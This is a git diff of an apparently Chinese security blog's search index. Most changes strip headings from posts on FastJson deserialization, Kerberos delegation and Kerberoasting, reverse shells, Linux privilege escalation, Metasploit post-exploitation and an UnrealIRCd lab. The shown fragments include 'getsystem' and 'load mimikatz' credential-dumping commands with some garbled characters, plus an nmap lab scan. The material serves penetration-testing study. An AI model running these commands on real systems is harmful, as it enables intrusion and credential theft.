-    <content><![CDATA[<h2 id="java安全–FastJson-1-2-22-1-2-24漏洞分析"><a href="#java安全–FastJson-1-2-22-1-2-24漏洞分析" class="headerlink" title="java安全–FastJson 1.2.22-1.2.24漏洞分析"></a>java安全–FastJson 1.2.22-1.2.24漏洞分析</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换。最近几年fastjson爆出了不少漏洞，但源头还是fastjson1.2.24爆出的反序列化漏洞,本文记录学习调试该漏洞的过程。</p>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换。最近几年fastjson爆出了不少漏洞，但源头还是fastjson1.2.24爆出的反序列化漏洞,本文记录学习调试该漏洞的过程。</p>
 <h3 id="初探fastjosn反序列化"><a href="#初探fastjosn反序列化" class="headerlink" title="初探fastjosn反序列化"></a>初探fastjosn反序列化</h3><h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>Fastjson在进行反序列化操作时，并没有使用默认的readObject()，而是自己实现了一套反序列化机制。我们通过操作操作属性的setter getter方法结合一些特殊类从而实现任意命令执行。</p>
 <h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h4><p>我们可以首先构造一个User类:</p>
 <figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">package com.fastjson;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Demo</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> name;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(<span class="keyword">String</span> name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -3859,7 +3856,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>kerberos域委派攻击学习</title>
     <url>/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/</url>
-    <content><![CDATA[<h2 id="Kerberos委派攻击学习"><a href="#Kerberos委派攻击学习" class="headerlink" title="Kerberos委派攻击学习"></a>Kerberos委派攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​    域委派是大型网络中经常部署的应用模式，给多跳认证带来很大的便利，同时也带来很大的安全隐患，利用 委派可获取域管理员权限，甚至制作深度隐藏的后门域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限开展域内活动。</p>
 <h4 id="域委派的基本过程"><a href="#域委派的基本过程" class="headerlink" title="域委派的基本过程"></a>域委派的基本过程</h4><p>​    委派（Delegation）是kerberos相对于NTLM认证独有的特性，指的是A可以让B<strong>“代理”</strong>自己去访问C服务，说是代理，也可以理解为<strong>“假冒”</strong>。</p>
 <p>​    具体为：域中A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，因为用的是A的身份，所以只有A有权限访问C的时候，委派才能成功。</p>
 <p><img src="/2020/08/05/kerberos-yu-wei-pai-gong-ji-xue-xi/20200505104626.png-water_print" alt="img"></p>
@@ -4017,7 +4014,8 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>msf反弹payload学习</title>
     <url>/2020/04/27/msf-fan-dan-payload-xue-xi/</url>
-    <content><![CDATA[<h2 id="学习msfvenom生成反弹payload总结"><a href="#学习msfvenom生成反弹payload总结" class="headerlink" title="学习msfvenom生成反弹payload总结"></a>学习msfvenom生成反弹payload总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><pre><code>我们知道目前来说流行的shell主要有两种，一种是正向shell(bind_shell)一种是反向shell(reverse_shell)</code></pre><p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
+    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>​    我们知道目前来说流行的shell主要有两种，一种是正向shell(bind_shell)一种是反向shell(reverse_shell)</p>
+<p><strong>正向shell</strong>:攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。(攻击者-&gt;被攻击者)</p>
 <p><strong>反向shell:</strong>被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。(攻击者&lt;-被攻击者)</p>
 <p><strong>nc</strong>可以实现一个很简单的正向与反向shell连接的示例：</p>
 <p>正向</p>
@@ -4202,7 +4200,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>linux提权综述</title>
     <url>/2020/04/29/linux-ti-quan-zong-shu/</url>
-    <content><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>​        当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>​        当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
 <p>，要判断我们应该先对系统相关的信息进行收集。</p>
 <h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul>
 <li>已经拿到低权限shell</li>
@@ -4385,7 +4383,7 @@ xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;text/plain;charset=UTF-8&qu
   <entry>
     <title>msf后渗透部分学习</title>
     <url>/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</url>
-    <content><![CDATA[<h2 id="msf后渗透常见操作总结"><a href="#msf后渗透常见操作总结" class="headerlink" title="msf后渗透常见操作总结"></a>msf后渗透常见操作总结</h2><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul>
+    <content><![CDATA[<h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul>
 <li><p>已经获得目标系统控制权后扩大战果</p>
 <ul>
 <li>提权</li>
@@ -4492,7 +4490,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>kerberosating攻击学习</title>
     <url>/2020/08/05/kerberosating-gong-ji-xue-xi/</url>
-    <content><![CDATA[<h2 id="kerberosating攻击学习"><a href="#kerberosating攻击学习" class="headerlink" title="kerberosating攻击学习"></a>kerberosating攻击学习</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。</p>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>​        Kerberoasting攻击是Tim Medin在DerbyCon 2014 上发布的一种域口令攻击方法，Tim Medin同时发布了 配套的攻击工具kerberoast。此后，不少研究人员对Ker beroasting进行了改进和扩展，在GitHub上开发发布了 大量工具，使得Kerberoasting逐渐发展成为域攻击的常用方法之一。</p>
 <h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><h4 id="kerberos协议认证"><a href="#kerberos协议认证" class="headerlink" title="kerberos协议认证"></a>kerberos协议认证</h4><p>可以参考前面关于票据部分的讲解。</p>
 <p>kerberos协议的认证授权过程，3次涉及使用<strong>不同账户的NTLM</strong>作为密钥加密数据。</p>
 <ul>
@@ -4746,7 +4744,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
   <entry>
     <title>经典漏洞msf攻击实验记录</title>
     <url>/2020/04/30/msf-gong-ji-shi-yan-ji-lu/</url>
-    <content><![CDATA[<h2 id="经典漏洞MSF攻击实验记录"><a href="#经典漏洞MSF攻击实验记录" class="headerlink" title="经典漏洞MSF攻击实验记录"></a>经典漏洞MSF攻击实验记录</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p>
+    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>这篇文章记录一些自己使用msf进行的一些实验。</p>
 <h3 id="msf利用UnrealIRCd后门漏洞攻击"><a href="#msf利用UnrealIRCd后门漏洞攻击" class="headerlink" title="msf利用UnrealIRCd后门漏洞攻击"></a>msf利用UnrealIRCd后门漏洞攻击</h3><p><strong>攻击主机：</strong>Kali linux, IP地址：192.168.153.176</p>
 <p><strong>漏洞主机：</strong>linux   IP地址：192.168.153.131</p>
 <h4 id="nmap扫描开放端口"><a href="#nmap扫描开放端口" class="headerlink" title="nmap扫描开放端口"></a>nmap扫描开放端口</h4><p> 利用命令： nmap -sT -v 10.1.1.136 扫描漏洞主机开放端口信息,扫描结果如下</p>
@@ -5222,7 +5220,7 @@ getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��t
     <title>免杀学习--powershell加载shellcode免杀</title>
     <url>/2021/08/06/mian-sha-xue-xi-powershell-jia-zai-shellcode-mian-sha/</url>
     <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="cac4523fea350031a8191ae5504ba0e9349ce64224668cebcf0dea1e3cad44ca">c59e9380f1c5fd910807978d93c415076a38c50f8fbdeff601e3ca50b1ee38697497487205ea7861ffc1df5df307177ae758d9a4544b48f7da6dbb58fe5dc621a31d0723448f2310034ee6417f19e6d922bd6e60d2e58a4e30675ebc9940967b669968c8c3e19aa58f3666367c6a877e20279910e54d537bbb8031b8b3defe92750de61f83dfbb3026266a93f869e99ba50b1e853e1fce79b969c39ba45d9ae6620e96c428f499d0161476a6bcd917c3435847a9a0f944e2958516d5b9c2da40a2b974ccd3ddf93d74ec954aeb937342410e780ffb9e513553ddacc3583e1de981eef1c2db4e672852c3551ad2ce061e187bee8e2dcf3d7b3d3724a83f5191c8284a37c21cf2bb9d19540e4516ad4ad7c9d3c6b69eaccc622a62475763d37ca0a7a3bba0d83238097660fe8c3a15636d7e1ddd06edfba3971f40bdd5227db3703748df2727ddb55467c520a68d4f359e48fc9b3bf3521228b4681759fd279dc33bac0a2d3fa9d17cc00f741073a69717f5d59411de5228fc4d3283dbe92d89ff88471a96e87b46106463946448f32123d8b8e134e5c77bbebcf187458226e5eae8e90742063638cac6f1a7174b0286c3ee24f8b7b1697d73a9e3b5118fc02c7bf389535e3f07e27857331ae078ae4eae92cc4aa27e6019bf6df0588c8b7b658e6c4657ebd0ed094d012836330fff93d92cf983505ab53f17b06c37c9bffbe2ae6965bcc597500b761c89ddd554efdc2e84973280e82a30184749eeb15e21967baeca0616cd35e41449db37f77c606705e3ab3e0f4e3e1a444c9e14f1d7542d9999a2d2ed4d2d77e231cd4b45225cea906c08a7704e5266ff91414194a42e7b2c8a27318e66e97dd002745a29be3b68ec76b456a51c30c5178228e470f69380f29244e9a910e7fe6d80ce12f9fb96292ec3734561a77f51ae8ab962c92a731ef50885b3d8416ad0db4cd85b19d5afb1c1af16e078aff05ab52fbe2c7c65ef68b601160a773b70d7a93f7b5eaa8104499677f332391d244ec209e9d0412af7ee3d2a7dd7b2175422f30d322c0098dbcb680492affb47c903e99410a1abc861ea5babf05656fb555144e78b21f4a8932cbc7e83a67cc360d054d7e1a314bfe5ee1fde3d618f05f79512136fdac94c575860f3f66ea361d8b8f4e1306f23064b4d294fa38f6c20f8c83e2e596b343cfd821e035c88a58de34fb615053a63c6c83330bcb0adc5d8dd153d42efec6c5e853bf12f9d9e3d0d5bd7d5410c9029efc72afce9968d37f48239481317a8e3f4796b558c2ab67b9c9cca6f7017cbdf05db35c4c61d5eba900679c352ced15841343e85e5e5d259ff71f67aadeda8ff17dc65597cd9968f06d5ca899165db082fa736e00c2e71ef9c190cddad28f163836aaee584394b5579fb167967d7d4bb4730b561bda9b1cf2564f6bd003f42c2d3b960597b52a0da8a955d5b39dcdc3922a326cefa6fd749028c6110e061448d268dbafed9ec6310cc069ddcd0d9f4d115d8f61c4efade5c66fa54aad05e3cc53a1e45f26aa37a5afc2c3ffa694daf1a7cd513e148ba9ccdd7dc6f4fae2b2aa9cce1cd0bf1e2eebfae0e9bc1946e0c831dd1d079b229916b37e2afe56612dfae1836816240b3d71dc05e1ac3ec32ff92894bdc1c6dd5e1b4fe2df93a41c7507df646ef425c37106b92edf17e93099b2929e79bdcc4cb040617785e28527dc083399587acaf8c94d65d69684d74d29907fdc643f358d14db0cb20a88af90a0c09119ad2f4b7142e5e6b7bb33b8733c9a6b5278760f17b23acfea4b50ff765c11c2cd5d92e57b4eca2b0b3f6631a9c2cafc939dea7e740082c01a4124765ae7d0cc85d81f88568a5eae473dcdb37e236998904793bbb9ea7757b9e6c7587deb38791195902d6916d3c9a139c4b3ba147f224893ba30f3ee2d3103f37513127841a43a0972b3ab40d85f7aad8db0644f088023a7eb59349c189e3faad6f28be328e4f7637107ebba8127153d2f8d42135fb3d6ec707a9aeca5a66358a457b9bf1f46d09707aacf96ea37afd497c2b685aadcf6aad0f36fe8900d3195d8907a797cfcf186e9881638edde9900ad143fa964449f3e7cc212a662ab5a7a1c0a9402f25ed82809f9a2ad043bd2a215f2c27036171db1578203ba330b90de5ec3a48dcd26390069f3ce529c53d6740078ed08bbe6388bfd9eca98540c331081cdff66dd28d865f013ea73fd49316bf168b8605a9fa629cf7ea9168a7244ed85529fbf019d7de2c5e00a364554fc48361480dddcc05534c3a612a5c29d37c43b080b01f5a809a117a80da7b5f26db83218fbb6dc7ef5934dcad79a2fd6be77421299214948c935db380a0324a7e42894b48dd35f92b1a8ea62bb7ef223239eb7a25174a99b543eb13465ab2cf38cea5c2c7282ab6fb1ec5a0635406ae7f94c1b366dd6b44d24e53c33f2a29fe4646410a8cdff6312762394654ea90ce32f39290bcf04e1d4b2015998af5f1edfdd47d62208ed54cd54f88544a5b37f2e54d39141d026042e31a5612b1b3ab9af00ad96f7d6adf396df9abafe962826e0a3a8be0de48325df85cd4edca97035c7433dec3de30bd3eea189d2848c446355f59e770345a941e8bd52b4159986c3220468218a479cda76db05b12135788ffae7fe44e18e0973cfca9028df6316c59d9a89af7563b12f29bf2e12bd26006bd212a00fa585a3e6b5ef6f3f3c5108cc1154adb35149f359fbde9fd6365175b5905c12fb01afa4c725dbe2449e704af64a7cfd2e12bb30e01862e1719d043b8acb213a8e256056cfca98a14dd0fd5af1ea3aa5700eb99e4cf6235da3ce7cbe395d761bbc8daed81098c909afee80d7e8fe70d147ffd1a64e137abdbc63f1bac7a318bf77004e2d171b6cd05ba50858e572dc25f794f1b59c5c699990681833f4eb2609092e3ab7bbf5b53e0c675308a4dbabfdafbb75149b433d7fb0e1a1d140c628d0b58ca1d5a29eb40771cb80368cbe8f1491f4cb2c0ce06fff50844f6362ed525776cdb54933c245bcb9ecd01d6556b3bed1ea62285f1011614e37cc2b862451c2a79fc6734e0f00209df23d32e0b9a5f9b7142f5bd8d33f37d97446db5426e4191b96addaeb1a19a33f968719f5a63befb847ffd5eb7c0fa4bb2b68fdf94e1b773be8556c37c772da1dab29d749ca920afb1b9489880c8a42aefcbacd728b75efe6f2ed1be37ddd3e81d5ce4ed719d05953295ce29bb9732cd63c812222fb7e130a074e8fe282a8bfd2f855f50473d417b33835c19bda0e986dac03a53355914c8b665ceeef9f7731914d6f358df6a64d4f849e6dcfbbe8a147f93e427b2d5b9bc987dea94700ec3e28d2f59dd1d3fe195803afad0b96e8148cda8196ae80d7dcbbe02c4478e32b5aca92249916ce8da4e5058e982786cbedcbf1833dcb0c0dea70ee45d1cc950914f54be6b3b577de0f5adfb582987f04295cc55ab7239f88b8c6bcb81b374e9dc1d76c11b7cca1735fb34abc623b246fe6f052c322dd944d99dae8bcaaa46119633dadc50d6816c79868419ebd2b6e3cb3b2d5004e0390b80b7d1da9ea3c4192a404bfa6e37e444d055340fe85770a1daaf85981d2bb235122c3da1c24e8ed5a36c353e92d365127554b1ad5c329e2bb64337cfbd1504bfb07cdcb9b4317d00e63b02215e4741ec89f1fdb0a47d4cb90eb7fe120cac7e02cd9a9e209995219cf11336defe629bd7f99f739aea45e4592cebf0b4cc5b76e49473ec969e55aca7643f5867d05000a8400fa692ac9097cf1743fd972846a9efba04c86f2fd0589abc3114777f22101e3872ef6878046e1603a99aec2bd7a59e43cc5276001e654a8b37161ebdbe64ff72fcaa93ad1add19f19cb753e724946817e1ec60d721776d255de5ca8c040f4495f6f00b1e591f39957136a598a3700dc1b815f78b328e80d8318a30391389a3b881bea1cee1000df268ad929b8d97a6aceff7d7d78d890698591992e0dd803de691ffc04bbab75424c5fcb07d3c0b79954a889124ea80cb49fa6f92a1c35ae618f0104601cfdc549725819574f220541416a790764c80d8ba36f8734161305fc1ca852c86826d059047dcaba0d75785503abcc24ddb85587928e8b4822c2f70a4a8c1c520126da2e335d5f0ac4f1e836566256d0771f896788a82d35234ab49f8920e431de6fd6ece4fb07b4b586ef684e092a242f34d22dfa1136e7817b027ad951ecc65adebb143739f8e2c3333f77b3e82d2431648dc879b696696a852e2c537d350e3e48c500735aa50c2f8d0ec94261687e74ef677b3c02652268bf6b8deb0470de61581e242d2c2c8db4f45859d1cf71e2e37474ed73a57119d03082239227ff9101bde8ebfbf556f689b9b2d297fa6f1382d6bc3fe0b7b34499bf8eefa76e5e7b564f229907291192c7538c9018fac7a7d1b51d25f9b37355c57a19aa0782c30698104e70c95761c99ef8f077f5ecff47d4a9869d80914be6a367b72c90c65d853c815201d5c96f566f51742704cc29f109263b79daf7a48b5bca3867b4fd3c7e8f789801a22ef2a78129865c6486b35fd75e1f01112815f28b9d55fc98fb9ba62a7b7f16a03916c8d80fc84b573efb3e6890912d79c2aca39aa0b6288e3a319c7cac2cf2a652980dd8ef3743d11020eddbae9285b4a7a1051a43732587610803150344ad14ec6e2700e82f664d4a0247fadfb4a6e984836e8f4692b6ce8c0165d7325cc496fd467c5faac84d356623636a82b4d02edcacc8320a6630cce3da741b985afd62aa5a321e4c4e07dd9855944dcb12ee9e5fa591a7cce1f23c5f8247d9f6ca34aac150491ad8cc2d3f82c9fe3d99be20b03e8ffb3168f829662daa077e6cd3ae76b6eb56ca46b9c7459d068ecf1ff911dafb02e5cf5779b1a227cac804e884f89268537ab9185aa5488de4676ccc3576d86c30e144aa47eefcfaced525aed5f65f313c3d1f16c295f5058337878f98193b2da04253fef5b4b2b6b256b49b9af8e9a628c09af4a2bb6ba7fe84684bb19d30a0d072a07c936de6171a4ed7b0c62ae34b9bc0761017bc894942b5a997b3a53a6b79d39688d08c0c2e8bb703cebb8b8e2caf063e76f0ec09d0d956e541b4aea87e90513dfb740a422b78925039e8641851aab1daea76c900f9ac17da45521bc06bea5f99f2f227941a4fe5f45a3b76a841ce46ddce14f262ba602ac56c12cd740a2d880c81e3dc56d67f7c045570c2dd3086d3423d84bdcb1f66d5b200e42d48549d137e4ad978df54a7883e912df14be1101b60913c8cf4f9352df47f20545936434eefe4c982fc22c2e05189bb9005501a618d72d4de0781976da6a39f165948d69254e4ee6a7f3194dc5fa6100b2bb301f5f9eebd3ff86dfa537b4d1aeb96c9138ca5699637703e45f828bacaa3d55a58d277009d30999c4bf5c34107911891bb1d695e46022c962b87e925a3a4d207461cbd4ac681c1be54c7c89165f19a4fc224574b5c7075c55623aaab1f3e70c6f0786f82df50647dc9e9e4c4fe4cd40aa0a800b7ad44bfbf7b03d8594987bc6256854c0eb21cfe61fa89b328d8e7bb32f0d82bd24b3f5709aae1b64753222b44e88bd0190f7d318a840af5f5818687447b47bcd3cae99a7d56ce16f016927c3540331688562479905e48b97acfe41db6404e57df7a791fbaa0b5ac3e6af1534db36832c8edc02bc370784bab0f4034a56060695c1db7b20325c845fc5515160ae7f3e23b2b98662eb9d78903bd58f0d600df13188a05c450aafb1d670bf003e9374d727a2a335b2124718441dbf2b7da7c8065c4da9f69750aa0a7bee63ee8ec090efbb624f181eeeca4e3a83ffc67fa049fa8ba5f034d0377bd1b23c762cd64b91e646e1b11d5490b61c7cf1eb49bafe7d4735324dc88d1f15fc662402a36629abd4ed72b3e566ea1b581f64f0ee2e21f940860b1b1afdcd2b3a35120b7cb6b944e07473dca89e97a25c20f5bc7874cc55dce2efa7718c0f71ab399c2a20dad61d4815527deb5dcc35b81f78a8e5cf9cc0bc70d327ce285924bf2fe04a68bb58716f96c859956bf4d80531feb90073c96cc4c873dcf4635434ee09265ebde3d0b78ac1b80f835e963664ed7683513730e781e96409f7f42670d5c96605e3bb5e2af9e1aa04fb18a5c2d177ea3c97b4340943eb85bef6f341d3a442a4ac756e2ac9f808d5e12596eef3ae3fecb52f02195524a3579fccf0ac2d72b4acf6439d6d94b977c8341aba84cc560941d1153a422564c44ff0044d591d6a238391da390c7f82d49331de188240ae369acd8d85ca4ab4e58d6f99006e1e70520ac037926c56ed61270c49b881d6722b33aee6b04c31d4684d87e7132d9c14973629b96cc200e0f45e1415068650d7ab91f81fe25e4dc5f4bd06668de22d3da68a5016eb9c070cec9a0af42c0363410a2faa94ac9032b0aed42d3c845a385f43f36db7dd8a85671553094675b1c8d1cf41c8171840235ff1330d997d3711095fdea9c383f097c2b47988bb5c27c86e70b1ed63ed3ec5150b9d03d2ef404211b81deb68227038d13110e9018cd5dadb4d8ff997f92df32b805864059a0d739bf76794e9c6eb34792abd93397196ce183c0a2fdf0222e4f1738d5694063f2e475fc6ddc9add745b92bcd7b4c4f5730d5cdd0c1e7302c3b755223b587a462a70114244a1e82de12e7cf997639099bc25de725b862e26009f11d2b8216d7623f0aab521665a6828802d278e075ac7fb0edda4991970770fc55f6e7b96fc26dd3282062b17cfada35dce6b5b13f9a7880cf3226106c93733ba2a39e5398d62039df5b5cddef9eb511c65fa7a808bffa7edecff67f1da4946fd5dd3ed4475ca358b90821e944c0ccb048b6356bdbee9e0f594a94ca21d3d8ffade46910b3fffddf5294389dd0392a414a7371f569de87e444e8c3ceaf6026219ee7e0dbaad3414bdaec6deea5f52deb3c6e22e204826c9e33f6b44f0ce68b0acb2b5b62ee910e217603d7b2c6ea812ae60bbe0d68f2859f777d83948e3922efff5b9fba0889468ad736be7dd192c5461017e38f292646032e96d1edaccc2ba5523d69000cbe8379a8646519415c70eb793f53f645b6163323285c2b08e3121af02f5c17da582224fe38cace7f4ea2ca3bb0abe1d34e8dd5efbb45484653cee11ed612c83380f705315a29c06cdd92957f9411d6581b4f0e34c4201118162dd6356a0576acc1328ca5d395ee491357c13aeb22d708a7ba4fa0598c0a7da94b2e440596d29585f40d189b0eda3495ce46a2d7879d6203ccfd5bc2b07807364dd7e6bec1895f30a149fc4e536c1a5be0eaa1076fc9c09577c89415fb87634e548f6c52b91805dec91088b604bedec92b6ca9236b06049980af3572c5d8ff4fb8c6fb590216057e464149c84f8814c8774b43b591a9b17c83c3151eae0f4d163322d14f40e282c569b33de55ecdeaa754f1dd0b4d8f402623bb8a8b9c3bf62a429f0ddc7fd53b448cb734b4c20fbaf58fd495f6cc8c78462586719deefbdbff02a05ce79ae7d6db16a8c0f0934cfa3c2dc0c9f03ef88a5d0b5daf14a4f11698641928f9192339a5b0a78aec3d95b398977dcf37fccec90b2cd6b782d482062f6a23d92957b6923d5ca8f6bb21c51c71738784387936f9a603bef4fb7cb4134a7b50b7b4f326b50300c3635edc3890633fc7a492a88bb4c8674da5305580bf7261bbc09a2c677e4290963aa656f3e2482c2d584a2bb23deb67f9c989daf9d47dc5914fd3c3fa5b5a4831a8e49341e2f6635222e51dfc98486c14b7652f28939f3bd70cf7cc8d2e5cfb9f2c6964084472805f70d598aafbd4e8b7b58a8175580bdb062b563f8d94ce6468c4c3b4edcf15788cb695cb27e6c26c8f8692b86cba6bb017a3a3a864facd50a9c0fa193e4931f61963e3b201ee1bd2a4de0a38f6a4314671dc44d7144ced5779af9dac9a59faadb50925811aba79f97c139c89af1d8d4dbb912515b09014cbaa1877dc72623ce48db5a1459b5f14901ee33217cf5f00b548bb66ed5a59bfc7fe3615a77b0757769f8b173199f71ce025e81ed4848f1c0e7a03807fb23f1aa65be22a6a440d28dc240aaa4b85f0b3183fb12c8a47c5f842a79ce0f45bd87c85e3f7eb6802c44b6e70bb2ecf02ae8c51c30ef24d1b497346ac18c748711748e22f883b2ebc8fdba84eecc8d9a355fc5e2cd7b343d52b3490c1c120f8ba8fb7fa3245c38ab91ae7ed281cc0e014cac9511c22f1da77bfa6421c2c1fa5803d13569303b31071381f4747c5f8f41284c302be446dfb3c5a773130644fd46afe4c2872997cd02de6ee3081cf5ec5e3b59bb043885f96a2a7e620ae0216b4c09b01a2f408de49fc77477ba2d6376f0812e54c813137c252ace7b4b96d60a7a761485f24447b8301d2d725f7b1b049653dd83330480f662dcfac32f5d16464798ad704b4cc559d54c7eeb048ed8429d3576881c41c899735839b52fecaaf4ab75a07084f50cdd9be47eea0b98c8cdb59b157abc87faa5fb0f918fe69388d9a29016727000e6cc2cdc96718133a343e00b5a11f97eec2c82d7eb0bec8dea45f42e96dba7219c41949f896388349355da8f7d5b5fa460e7413622a83ec955288d2d0cecbed34a7cd4be3c85497c8ff2f9e8a3f12c07e1941cb02040f94224bda1e67eaddd911f4ef736c1180a98b6a6fe82f2b809bc6582932de20aefc90218822022486cb8b32eaba6848bb1970dddebbcf902cce4711059935d9abe3edc344fb067f629afb169c32c7e6903e971d5902e87bb4008c8a615608cc3a4f97daada13ba2d472516e5c70cecc4da792373c3fe73e166df400fef3695ea4b6a7434360a5a56ed2d49a8e7fc8c4e7bd2902bb69f143833f125402b45135a4640a3d2a7a85414de013ab42313ff8f56271590c20253d8cfd6f9017a5c390c9f32c4824e50228ce674f3300a30f5ce40d51b596722db1922519d2577e6ea3db27a334d1649e4aba7a3367fe2253b53d640d5ad77bdbab14eb711a9d42ae9482a83c5afeee95c34ee85261917281bb0e206e815a16e269b5f3e09dbce65b37ef5d1f393acf18cbe471ca5a87814479f6371e78bc4f235c34b9d199ad9048ace622c4d82968885bbdb70fbebac2a6dd91ec0883b98b86b7b9fce64f214276abcaa40d981be0c27bf951030fdfe5500128f0418d854883c135f5f3526b1b8aacd208c6fc10cf03b85b1fc9edd6b63596b5b6ba02169d0690b00c35da37539b081ccd58663d473e8b511a9cdd0841cf9dd7a289670e2b93c70bcfe6087a8ec2a7a53007f74bf8ec55da70b16c51596c01dc6a179a33d6a5deff71323653867eee6bf9f8217d3bfab083fd5647f7b1139ef97a16299b2cc928f073d2f84b4d43d406e733978a577e2c1d982b21059bbcfce21f9cd34c0ceab58658a3563c33aa4b1f7f340d41a07cb27c52849f30608a183dfeb48ce25ead9723a1e542a91b4ab8f32972dfc150fef07f46fa3dc4b1a495b3be30d12772bb8789bc59af6aa99d1ee54c67272beb4dcd369d5b7ee6e8b6dec7ae8101ca53f6cd886d53982c1896aecfc6b93689468ef71172021fa5caa864c118cb978a80421ae94046fdbca961bbb1ceee14a1f0b5362e8576d6eaaa3e1e71fe7c15d4cf8bab39c2de790c52d4789223b3319244386baa56cf455c04efbd0892a4d97d6596de8e2bcdcffe08dd7318666178a6604ec51d8019bca0333085c68f70c823d07526a3a7dcf4f2a012eb7e92049f33b01f03b50cacadcdc0b731a078893fb5a366eee680cdce3f